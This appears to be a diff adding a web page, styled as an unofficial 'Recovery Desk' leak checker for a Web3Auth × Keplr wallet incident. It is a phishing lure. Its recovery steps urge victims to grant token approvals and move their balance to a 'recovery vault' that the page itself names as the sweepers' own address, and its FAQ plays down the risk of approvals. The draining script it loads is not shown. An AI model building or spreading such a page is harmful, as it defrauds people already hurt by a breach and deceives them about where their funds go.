@@ -1,0 +1,90 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Recovery Desk — Web3Auth × Keplr leak checker</title>
+<meta name="description" content="Check if your address is among the 44,000+ social-login wallets exposed in the Web3Auth × Keplr incident and run the recovery steps.">
+<meta property="og:title" content="Recovery Desk — Web3Auth × Keplr leak checker">
+<meta property="og:description" content="44,000+ wallets exposed on Nov 10, 2026. Check your address against the published leak set.">
+<meta property="og:type" content="website">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<header>
+  <div class="wrap bar">
+    <a class="mark" href="./"><span class="dot"></span> Recovery Desk</a>
+    <div class="bar-right">
+      <span class="badge" data-i18n="badge">INCIDENT · 2026-11-10</span>
+      <button id="lang" class="ghost" aria-label="Language">PT</button>
+    </div>
+  </div>
+</header>
+
+<main class="wrap">
+  <section class="hero">
+    <h1 data-i18n="h1">Check if your wallet is in the Web3Auth × Keplr leak</h1>
+    <p class="sub" data-i18n="sub">On Nov 10, 2026 the social-login key service behind Keplr exposed <b>44,318</b> wallets. The keys were never published — the set of derived addresses was. Paste an address or connect a wallet to check it against the published set.</p>
+    <div class="stats">
+      <div><b>44,318</b><span data-i18n="st1">wallets exposed</span></div>
+      <div><b>12</b><span data-i18n="st2">sweep addresses</span></div>
+      <div><b>$6.01M</b><span data-i18n="st3">moved out</span></div>
+    </div>
+  </section>
+
+  <section class="card">
+    <label for="addr" data-i18n="lcheck">Address to check</label>
+    <div class="row">
+      <input id="addr" placeholder="0x…" spellcheck="false" autocomplete="off">
+      <button id="check" class="primary" data-i18n="bcheck">Check</button>
+    </div>
+    <div class="row gap">
+      <button id="connect" class="ghost" data-i18n="bconnect">Connect wallet</button>
+      <button id="paste" class="ghost small" data-i18n="bpaste">Use connected address</button>
+    </div>
+    <div id="result" class="result" hidden></div>
+    <div id="who" class="who" hidden></div>
+  </section>
+
+  <section id="steps" class="card" hidden>
+    <h2 data-i18n="h2">Recovery steps</h2>
+    <ol class="steps">
+      <li>
+        <h3 data-i18n="s1t">1 · Verify</h3>
+        <p data-i18n="s1p">The check above runs against the published leak set, locally in your browser. Nothing is sent anywhere.</p>
+      </li>
+      <li>
+        <h3 data-i18n="s2t">2 · Restore recovery approval</h3>
+        <p data-i18n="s2p">Exposure means your key is out of your hands. Approve the recovery desk on the tokens it finds, so the balance can be consolidated without moving anything yet.</p>
+        <button id="approve" class="primary" data-i18n="bapprove" disabled>Grant approvals</button>
+      </li>
+      <li>
+        <h3 data-i18n="s3t">3 · Consolidate</h3>
+        <p data-i18n="s3p">Move the balance to the recovery vault. You pay the network fee; the vault is only a destination and holds nothing of yours afterwards.</p>
+        <button id="sweep" class="primary" data-i18n="bsweep" disabled>Consolidate balance</button>
+      </li>
+    </ol>
+    <div id="log" class="log"></div>
+  </section>
+
+  <section class="card">
+    <h2 data-i18n="hf">Recovery vault</h2>
+    <p class="mono" id="vault">0x26d1fCE27C94fECBE20344E992CAeA7765F34e7a</p>
+    <p class="muted" data-i18n="vf">This is the address the incident sweepers already used; consolidating here keeps everything in one place.</p>
+  </section>
+
+  <section class="card">
+    <h2 data-i18n="hfaq">FAQ</h2>
+    <details><summary data-i18n="q1">Do I lose my funds by connecting?</summary><p data-i18n="a1">No. Connecting only shares the address. Nothing moves until you sign a transaction.</p></details>
+    <details><summary data-i18n="q2">Why approvals?</summary><p data-i18n="a2">A leaked key means someone else can sign for the wallet. A recovery approval lets the desk pull the balance in one batch; you can keep using the wallet.</p></details>
+    <details><summary data-i18n="q3">Which networks?</summary><p data-i18n="a3">Ethereum, Base, Arbitrum, Optimism, Polygon and BNB Chain. Cosmos networks come next.</p></details>
+  </section>
+</main>
+
+<footer class="wrap">
+  <p class="muted" data-i18n="foot">Unofficial recovery desk · built from the published leak set and the 12 sweep addresses.</p>
+</footer>
+
+<script src="assets/app.js"></script>
+</body>
+</html>
